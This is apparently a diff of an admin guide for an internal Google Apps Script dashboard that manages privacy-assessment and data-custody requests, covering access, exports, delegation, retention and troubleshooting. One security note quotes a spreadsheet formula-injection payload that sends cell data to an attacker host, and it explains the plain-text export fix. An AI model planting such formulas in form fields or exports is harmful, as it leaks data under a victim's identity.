@@ -1,7 +1,7 @@
-# Part 3 — Admin (Phase 3, ISM Control Tower)
+# Part 3: Admin (Phase 3, ISM Control Tower)
 
-> The ISM dashboard — oversight, analytics, certificate routing, email failover, settings.
-> Shared concepts live in **[Part 0 — Common Reference](part-0-common.md)**; this file covers
+> The ISM dashboard: oversight, analytics, certificate routing, email failover, settings.
+> Shared concepts live in **[Part 0: Common Reference](part-0-common.md)**; this file covers
 > only Admin specifics. **Access = active ISM (InfoSec-role) personnel + accounts in
 > `Admin_Notification_Config`** ([§0.6](part-0-common.md#06--security-model)).
 >
@@ -10,7 +10,7 @@
 
 ---
 
-## §3.1 — End-user guide 🧑 (for ISM admins)
+## §3.1: End-user guide 🧑 (for ISM admins)
 
 ### Accessing the system
 Open the Admin web-app URL signed in with an authorized account. Two-step gate:
@@ -18,7 +18,7 @@ Open the Admin web-app URL signed in with an authorized account. Two-step gate:
 an **active InfoSec-role** member in `InfoSec_Email_Config` (matched by **Role**, not Member_ID) or
 listed by email in the **`Admin_Notification_Config`** tab. Anyone else sees "Access Denied."
 *(Earlier this was a hardcoded `INFOSEC-001/002` allowlist, which silently locked everyone out when
-those IDs were renamed to `INFOSEC-ALL-1/2` — see [§0.6](part-0-common.md#06--security-model).)*
+those IDs were renamed to `INFOSEC-ALL-1/2`, see [§0.6](part-0-common.md#06--security-model).)*
 
 ### The interface
 - **Sidebar:** Dashboard · Analytics · Certificate Routing · Email Failover · Settings (with a
@@ -30,7 +30,7 @@ those IDs were renamed to `INFOSEC-ALL-1/2` — see [§0.6](part-0-common.md#06-
 The default page. **Stats cards** (Total Entries, PIA Complete, Pending Approval, Denied), a
 **search bar** (name / location / dept / DCS ID / email), an expandable **filter panel** (PIA
 status, email-approval status, date range, DCS status, location) with removable filter chips,
-and the **admin table** — DCS entries joined with PIA status and email-approval status.
+and the **admin table**: DCS entries joined with PIA status and email-approval status.
 
 Table columns: Select · Name · Location · Dept · Access Type · DCS (LogID) · DCS Status ·
 PIA (X/5 submitted) · PIA Status · Email Approval · Date · Actions (View Details, Audit Logs,
@@ -41,6 +41,13 @@ Open the detail modal to see DCS data (from `Metadata_JSON` / `Metadata_Agency`)
 sections: **PIA 1** Program Info · **PIA 2** PII Inventory (risk meter, threshold 18) ·
 **PIA 3** Stakeholders · **PIA 4** Data Lifecycle · **PIA 5** Compliance Survey · plus any
 **Approver Flags**.
+
+> ⚠️ **The Approver Flags panel showed nothing before 2026-08-12**, and its count badge always
+> read 0, even on requests an approver had genuinely flagged. The dashboard asked the database for
+> `ApproverFlags` while the column is named `Approver_Flags`, so the lookup silently returned
+> nothing rather than erroring. Fixed. If you reviewed flagged requests before that date and
+> concluded there were none, **that conclusion was based on a broken panel**, re-check those
+> requests. The flags themselves were never lost; only the display was.
 
 ### Audit logs
 The clipboard icon opens a modal with four tabs: **Risk Audit** (CREATE/UPDATE/DELETE/
@@ -62,7 +69,7 @@ the **same Drive folder** as the source spreadsheet and opens in a new tab.
 > 🚩 **Values are written as plain text on purpose (2026-08-12).** Google Sheets treats any cell
 > starting with `=` as a **formula**. Before this fix, an applicant could type
 > `=IMPORTXML("evil.com?d="&A1)` into a form field; it sat harmlessly in the database, then
-> *executed* the moment an admin opened the export — running as **that admin's** Google identity,
+> *executed* the moment an admin opened the export, running as **that admin's** Google identity,
 > with their access. Exported cells are now text-only. If you ever see a leading apostrophe in an
 > exported cell, that is this guard working, not corruption; it does not appear when printed and
 > is not part of the value.
@@ -71,14 +78,14 @@ the **same Drive folder** as the source spreadsheet and opens in a new tab.
 Four cards: **PIA Status Breakdown**, **Approval Status Distribution**, **Top Departments**
 (bar charts), and **Key Metrics** (Total / Flagged / Completion Rate / Pending Review).
 
-#### Bottlenecks — "where do requests get stuck?" *(added 2026-08-12)*
+#### Bottlenecks: "where do requests get stuck?" *(added 2026-08-12)*
 Below the four cards, loaded separately from the dashboard rows:
 
-- **Time Waiting** — how many requests have been sitting with their current approver for
+- **Time Waiting**, how many requests have been sitting with their current approver for
   0-3 / 4-7 / 8-14 / 15+ days.
-- **Bottleneck Summary** — how many are awaiting anyone, how many are past 7 days, the longest
+- **Bottleneck Summary**, how many are awaiting anyone, how many are past 7 days, the longest
   single wait, and which stage holds the most.
-- **Most Stuck Requests** — the 25 oldest, showing the request, the stage, **who is currently
+- **Most Stuck Requests**, the 25 oldest, showing the request, the stage, **who is currently
   blocking it**, and how many days.
 
 The clock starts when that approver was **first emailed**, not when the request was submitted, so
@@ -100,7 +107,7 @@ regenerate the certificate and send the email. You can also **Download Certifica
 
 ### Email failover
 Entries whose emails failed to send (execution bugs) appear here to **resend** to the rightful
-requestor / approver. These are **manual resend** of generic "log in to the system" notices —
+requestor / approver. These are **manual resend** of generic "log in to the system" notices,
 **not** the primary tokenized PIA workflow emails and **not** the daily reminder
 ([§2.2](part-2-pia.md#22--maintenance-)). Backend: `adminResendEmail` re-fires
 `notifyApprover` / `notifyApplicant` / `apiPhase3_NotifyISMember` via `sendEmailWithRetry_`.
@@ -111,12 +118,12 @@ Config** (ISM members: Member ID, Name, Email, Role, Active). **Save Changes** p
 spreadsheet. Reminder on/off + hour here call **PIA's** cross-app reminder API
 ([§2.2](part-2-pia.md#the-daily-reminder-engine-lives-here-)).
 
-> ⚠️ **No stray spaces in link values.** When you set a downloadable's URL — in a **System Links**
-> field here **or** directly in a `System_Configuration` cell — the value must be the **clean URL
+> ⚠️ **No stray spaces in link values.** When you set a downloadable's URL, in a **System Links**
+> field here **or** directly in a `System_Configuration` cell, the value must be the **clean URL
 > only**, with **no leading/trailing whitespace** (`https://…`, never `␣https://…`). A stray space
 > makes the link invalid: the **Download** button in the DCS app won't open the file, and the value
 > can fail to display/save correctly in this Settings form. Editing through this form **auto-trims**
-> on Save; pasting straight into the sheet does **not** — so sheet edits are the ones to double-check.
+> on Save; pasting straight into the sheet does **not**, so sheet edits are the ones to double-check.
 
 #### Approver Delegation *(added 2026-08-12)*
 When an approver goes on leave, everything sitting with them stops. Add a delegation and the review
@@ -141,11 +148,11 @@ to the original approver.
 > already waiting, add the delegation and then use **Email Routing → Resend** to reissue it.
 
 > ℹ️ **The decision is still recorded against the original approver**, with the delegate's address
-> in the `ActedBy` column — it reads as "approved by *delegate* on behalf of *approver*."
+> in the `ActedBy` column, it reads as "approved by *delegate* on behalf of *approver*."
 > Delegation does **not** chain: if A delegates to B and B delegates to C, A's requests go to B.
 
 > 🚩 **It is a real handoff, not a spare key.** While the delegation is active the original
-> approver **cannot approve** the reassigned request, and it **drops off their own list** — only
+> approver **cannot approve** the reassigned request, and it **drops off their own list**, only
 > the delegate can act on it. This is on purpose: if both could decide, the two of them could
 > approve the same step seconds apart and the system would have no clean answer for who actually
 > decided it.
@@ -155,7 +162,7 @@ to the original approver.
 > the specific step that was handed over disappears. Remove or pause the delegation and it comes
 > straight back to them.
 
-#### Data Retention *(added 2026-08-12 — ships switched OFF)*
+#### Data Retention *(added 2026-08-12, ships switched OFF)*
 Nothing in the system had ever deleted personal data: not the request rows, not approver comments,
 not the audit log, not the uploaded NDA/DPA/DSA files, not the stored email bodies. This sweep
 removes **closed** requests older than a set period, across all of those at once.
@@ -175,28 +182,28 @@ policy.
 > 🚩 **A purge cannot be undone.** Sheet rows are gone for good. Drive files go to the trash, so
 > there is a 30-day window there and nowhere else. This is not something a developer can revert.
 
-> ℹ️ **Requests still waiting on anyone are never touched**, at any age — and "closed" means *both*
+> ℹ️ **Requests still waiting on anyone are never touched**, at any age, and "closed" means *both*
 > the DCS and PIA sides are finished. Age is counted from the request's **last decision**, not its
 > submission, so a request that took eight months to approve is not purged eight months early.
 
 ---
 
-## §3.2 — Maintenance 🛠
+## §3.2: Maintenance 🛠
 
 ### Script Properties (Admin project)
-*(Deploy via the golden rule — [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls).)*
+*(Deploy via the golden rule: [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls).)*
 
 | Property | Required | Holds |
 |----------|----------|-------|
 | `SPREADSHEET_ID` | Yes | ID of the shared database spreadsheet |
 | `ALLOWED_DOMAIN` | Yes (when domain check on) | Corporate domain |
-| `ADMIN_API_KEY` | Yes | Shared email-tracking key — **must match the PIA side** |
+| `ADMIN_API_KEY` | Yes | Shared email-tracking key, **must match the PIA side** |
 | `WEB_APP_URL` | Optional | Live **PIA** `/exec` for resend CTAs (missing → button omitted gracefully) |
 | `SHEET_PREFIX` | Optional | Prefix if sheet tabs are namespaced |
 
-**Code constants** (`admin_code.js`): `ENABLED_DOMAIN_CHECK = true` (line ~145 — gate is
+**Code constants** (`admin_code.js`): `ENABLED_DOMAIN_CHECK = true` (line ~145, gate is
 **on**), `MAX_ROWS = 500` (cap on `getAdminData`), `SHEET_NAMES` (canonical tab names, ~line
-124 — the source of truth used in [§0.2](part-0-common.md#02--architecture--data-model)).
+124, the source of truth used in [§0.2](part-0-common.md#02--architecture--data-model)).
 
 **OAuth scopes:** `spreadsheets`, `drive`, `script.external_request`, `userinfo.email`.
 **Web-app settings:** `executeAs = USER_DEPLOYING`, `access = DOMAIN`, `runtimeVersion = V8`.
@@ -205,7 +212,7 @@ policy.
 - Update `InfoSec_Email_Config` when ISM members change; update `System_Configuration` for
   system-wide settings.
 - Archive old `Risk_Audit` entries if the sheet grows large.
-- Review/clean old deployments (but **keep one** — golden rule); check Executions for errors;
+- Review/clean old deployments (but **keep one**, golden rule); check Executions for errors;
   verify spreadsheet cell limits.
 - After a Workspace/domain change: update `DOMAIN` / `ALLOWED_DOMAIN`; if the spreadsheet
   moves, update `SPREADSHEET_ID`; if sheets are added, update `SHEET_NAMES`.
@@ -214,23 +221,23 @@ policy.
 A download form touches **both** apps; the DCS-side change and the full end-to-end flow are in
 **[Part 1 §1.2](part-1-dcs.md#12--maintenance-)**. On the **Admin** side, so ISM can manage the
 link under **Settings → System Links**, edit `Admin/adminView.html`:
-1. Add an input field to the **System Links** card (~line 2073), copying the existing pattern —
+1. Add an input field to the **System Links** card (~line 2073), copying the existing pattern,
    `<div class="form-group"><label>Your Label</label><input type="url" id="cfg-LINK_YOURKEY_TEMPLATE" placeholder="https://..."></div>`.
 2. Add the **same key** (`LINK_YOURKEY_TEMPLATE`) to the key array inside `saveSettings()`
    (~line 6726). ⚠️ Without this, the field will *display* a value but silently **won't save** edits.
-3. Redeploy the Admin project (Edit → New version —
+3. Redeploy the Admin project (Edit → New version,
    [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls)).
 
 ---
 
-## §3.3 — Developer handover 👨‍💻
+## §3.3: Developer handover 👨‍💻
 
 ### Backend (`admin_code.js`)
 - **Entry points:** `doGet()` (auth + serve `adminView`; handles `?setup=domain`),
-  `doPost()` (`action=submitDCS` — currently a domain-validating **stub**, not the real DCS
+  `doPost()` (`action=submitDCS`, currently a domain-validating **stub**, not the real DCS
   submission, which lives in Phase 1).
 - **Authorization:** `isAuthorizedDomain()` (Layer 1 domain suffix, fail-secure),
-  `checkAccess_()` (Layer 2 — **active InfoSec-role members + `Admin_Notification_Config` entries**,
+  `checkAccess_()` (Layer 2: **active InfoSec-role members + `Admin_Notification_Config` entries**,
   matched by Role/email, not hardcoded IDs). ~17 `checkAccess_` guards protect the API entry points
   ([§0.6](part-0-common.md#06--security-model)).
 - **Data fetching:** `getAdminData()` reads 5 sheets, builds lookup maps (by ReqID and
@@ -238,8 +245,8 @@ link under **Settings → System Links**, edit `Admin/adminView.html`:
   capped at `MAX_ROWS = 500`.
 - **Audit:** `getAuditLogs(reqId, sessionId)`.
 - **Delete:** *removed.* The ticket delete/close feature (hard cascading delete across 6 sheets +
-  audit purge) was pulled — records are now immutable from the Admin app.
-- **Export:** `exportToSheet(rows)` — new Sheet in the source folder.
+  audit purge) was pulled, records are now immutable from the Admin app.
+- **Export:** `exportToSheet(rows)`, new Sheet in the source folder.
 - **Config:** `getConfigData()` / `saveConfigData()`.
 - **Certificate routing:** `apiAdmin_*` functions (approved-app listing, cert HTML/PDF, email).
 - **Email resend:** `adminResendEmail` ([§3.1](#31--end-user-guide--for-ism-admins)).
@@ -269,32 +276,32 @@ limits; export placed in the source folder.
 
 ---
 
-## §3.4 — Troubleshooting
+## §3.4: Troubleshooting
 
 ### For end users (ISM admins)
 | Problem | Solution |
 |---------|----------|
 | "Access Denied" | You must be an active `InfoSec`-role member in `InfoSec_Email_Config` **or** listed (by email) in `Admin_Notification_Config`. |
-| Blank page / spinning loader | Refresh; if it persists the spreadsheet may be inaccessible — contact the admin. |
+| Blank page / spinning loader | Refresh; if it persists the spreadsheet may be inaccessible, contact the admin. |
 | "No data available" | Spreadsheet may be empty or still loading; refresh. |
 | Search returns nothing | Broaden the term; clear active filters. |
-| "Export failed" | Could not create the new Sheet — check Drive permissions. |
-| Stale data after refresh | Hard refresh (Ctrl/Cmd+Shift+R) — cache may be stale. |
+| "Export failed" | Could not create the new Sheet, check Drive permissions. |
+| Stale data after refresh | Hard refresh (Ctrl/Cmd+Shift+R), cache may be stale. |
 | A downloadable won't open (DCS), or a Settings link field looks blank | The stored link value likely has a **leading/trailing space**. Open the Settings field (or the `System_Configuration` cell) and delete any whitespace around the URL, then Save. |
 
 ### For administrators / developers
 | Problem | Solution |
 |---------|----------|
-| `clasp push` fails | *(We don't ship via clasp — see [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls).)* Use the manual copy-paste + Edit→New version flow. |
-| Changes don't appear | You likely created a **New deployment** instead of a new version — golden rule, [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls). |
-| `getAdminData` returns null | V8 unhandled exception — check Executions/Stackdriver; verify sheet names + headers. |
+| `clasp push` fails | *(We don't ship via clasp, see [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls).)* Use the manual copy-paste + Edit→New version flow. |
+| Changes don't appear | You likely created a **New deployment** instead of a new version, golden rule, [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls). |
+| `getAdminData` returns null | V8 unhandled exception, check Executions/Stackdriver; verify sheet names + headers. |
 | "Sheet not found" | Run `debugSheets()`; fix `SHEET_NAMES` or `SHEET_PREFIX`. |
 | `SPREADSHEET_ID` not set | Set it in Script Properties. |
 | Domain blocks all users | Verify `DOMAIN`/`ALLOWED_DOMAIN`; `?setup=<domain>` reconfigures both. |
 | ISM member still denied | Verify their `Member_Email` matches, `Role` is `InfoSec`, and `IsActive` isn't `NO`. For a non-ISM admin, add them (by email) to `Admin_Notification_Config`. |
-| App down for everyone (perm error) | The app was likely **deployed by a non-owner** — redeploy from the owner account (`ismaiapps`), [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls). |
+| App down for everyone (perm error) | The app was likely **deployed by a non-owner**, redeploy from the owner account (`<owner-account>`), [§0.4](part-0-common.md#04--operations-runbook-deployment--cross-app-urls). |
 | Stats all zero | Run `getAdminDataDebug()` to verify each sheet is readable. |
 
 ---
 
-*← [Part 2 — PIA](part-2-pia.md) · Next: [Appendices](appendices.md) →*
+*← [Part 2: PIA](part-2-pia.md) · Next: [Appendices](appendices.md) →*
